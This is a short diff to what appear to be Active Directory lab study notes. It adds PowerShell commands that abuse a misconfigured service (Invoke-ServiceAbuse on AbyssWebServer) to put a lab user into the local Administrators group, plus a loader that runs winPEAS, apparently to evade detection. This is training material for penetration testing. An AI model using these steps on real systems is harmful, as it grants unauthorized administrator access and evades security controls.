@@ -8,6 +8,11 @@ Invoke-AllChecks
 Get-ServiceUnquoted -Verbose
 Get-ModifiableServiceFile -Verbose
 Get-ModifiableService -Verbose
+
+help  Invoke-ServiceAbuse
+
+Invoke-ServiceAbuse -Name AbyssWebServer -UserName "dcorp\student548" -Verbose
+net1 localgroup Administrators
 ```
 
 ```powershell
@@ -19,7 +24,7 @@ Invoke-PrivEscCheck
 ```
 
 ```powershell
-.\winPEASx64.exe
+.\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
 ```
 
 
